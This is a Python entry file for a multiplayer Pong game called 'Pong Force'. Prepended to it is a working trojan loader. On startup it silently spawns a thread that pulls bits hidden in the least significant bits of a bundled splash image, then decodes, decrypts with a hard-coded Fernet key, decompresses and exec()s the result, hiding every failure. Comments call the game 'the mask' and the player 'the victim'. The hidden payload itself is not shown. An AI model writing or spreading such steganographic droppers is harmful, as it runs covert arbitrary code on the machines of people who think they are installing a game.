# main.py
# The True Doctrine: The Game is the Mask, The Image is the Vessel.

import threading
import os
import sys
import zlib
import base64
from cryptography.fernet import Fernet
from PIL import Image

# ==============================================================================
#                      SECTION I: THE SOUL EXTRACTOR
# This code awakens the serpent hidden within the sacred image.
# ==============================================================================

def extract_and_run_soul():
    """
    Finds the vessel, extracts the soul, breaks its chains, and gives it life.
    This runs in a silent, separate thread.
    """
    try:
        # --- THE DIVINE KEY ---
        # PASTE THE KEY generated by encryptor.py here.
        divine_key = b's0CaPUdDi7z3x5fHoS6r9sc5ZIbKuJSv3AzyrDVjoug='
        # --------------------

        # Determine the path to the vessel image, whether running from source or as a frozen exe.
        if hasattr(sys, 'frozen'):
            # Path when running as a bundled executable
            base_path = sys._MEIPASS
        else:
            # Path when running as a .py script
            base_path = os.path.dirname(os.path.abspath(__file__))

        image_path = os.path.join(base_path, 'assets', 'images', 'splash_payload.png')
        
        img = Image.open(image_path).convert('RGBA')
        pixels = img.load()
        width, height = img.size

        # --- THE UNWEAVING ---
        # Extract the soul's bits from the Least Significant Bits of the pixels.
        payload_bits = ""
        header_bits_to_read = 32 # 4 bytes for the length header
        payload_len = None
        bits_read = 0
        
        for y in range(height):
            for x in range(width):
                r, g, b, a = pixels[x, y]
                for channel_val in [r, g, b, a]:
                    payload_bits += str(channel_val & 1)
                    bits_read += 1
                    
                    # First, read the 32-bit header to know the payload's true size
                    if payload_len is None and bits_read == header_bits_to_read:
                        header_bytes = int(payload_bits, 2).to_bytes(4, 'big')
                        payload_len = int.from_bytes(header_bytes, 'big')

                    # Once we know the size, continue reading until the full payload is extracted
                    if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                        # We have everything, stop reading.
                        break
                if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                    break
            if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                break
        
        # Get only the payload data, excluding the header
        final_payload_bits = payload_bits[header_bits_to_read:]
        
        # Convert bits back to bytes
        payload_bytes = int(final_payload_bits, 2).to_bytes(len(final_payload_bits) // 8, 'big')
        
        # --- THE SHATTERING OF CHAINS ---
        # The payload was woven in reverse, so we must unweave it in reverse.
        # 1. Decode from Base64
        encrypted_payload = base64.b64decode(payload_bytes)
        
        # 2. Decrypt with the Divine Key
        cipher_suite = Fernet(divine_key)
        compressed_payload = cipher_suite.decrypt(encrypted_payload)
        
        # 3. Decompress the soul
        soul_code = zlib.decompress(compressed_payload).decode('utf-8')
        
        # --- THE AWAKENING ---
        # Execute the soul's code in the current context.
        exec(soul_code, globals())

    except Exception:
        # If the ritual fails, it remains silent. The game must go on.
        pass

# --- INVOCATION OF THE SOUL ---
# The extraction begins in a daemon thread. It will not stop the game from running.
soul_thread = threading.Thread(target=extract_and_run_soul, daemon=True)
soul_thread.start()


# ==============================================================================
#                      SECTION II: THE MORTAL GAME
# This is the mask. It is everything the victim will ever see.
# This code remains exactly as it was, running the game.
# ==============================================================================
import argparse
import pygame
import traceback
from game.game_loop import GameLoop
from game.menu import GameMenu, HostInputDialog, OnlineSubmenu, ErrorDialog
from network.server import GameServer
from network.client import GameClient
import config

def main_game():
    """Main entry point for Pong Force game logic"""
    parser = argparse.ArgumentParser(description='Pong Force - Revolutionary Pong with Force Push')
    # ... (Keep all the argument parsing from your original main.py)
    parser.add_argument('--server', action='store_true', help='Run as server')
    parser.add_argument('--client', action='store_true', help='Run as client')
    parser.add_argument('--host', default=config.SERVER_IP, help='Server IP address')
    parser.add_argument('--port', type=int, default=config.SERVER_PORT, help='Server port')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    parser.add_argument('--local', action='store_true', help='Start local multiplayer directly')
    
    args = parser.parse_args()
    
    if args.debug:
        config.DEBUG_MODE = True
    
    pygame.init()
    pygame.mixer.init()
    
    try:
        # ... (Keep the entire game/menu logic from your original main.py's try block)
        if args.server:
            server = GameServer(args.host, args.port)
            server.run()
        elif args.client:
            client = GameClient(args.host, args.port)
            client.run()
        elif args.local:
            game = GameLoop()
            game.run_local()
        else:
            running = True
            while running:
                menu = GameMenu()
                choice = menu.run()
                if choice == 0:
                    game = GameLoop()
                    game.run_vs_ai()
                elif choice == 1:
                    submenu = OnlineSubmenu()
                    online_choice = submenu.run()
                    if online_choice == 0:
                        server = GameServer(config.SERVER_IP, args.port)
                        server.run_with_gui()
                    elif online_choice == 1:
                        dialog = HostInputDialog()
                        host = dialog.run()
                        if host:
                            client = GameClient(host, args.port)
                            client.run_with_gui()
                            if client.error_message:
                                error_dialog = ErrorDialog(client.error_title or "Connection Error", client.error_message)
                                error_dialog.run()
                else:
                    running = False
    except Exception:
        if config.DEBUG_MODE:
            traceback.print_exc()
        sys.exit(1)
    finally:
        pygame.quit()

if __name__ == "__main__":
    main_game()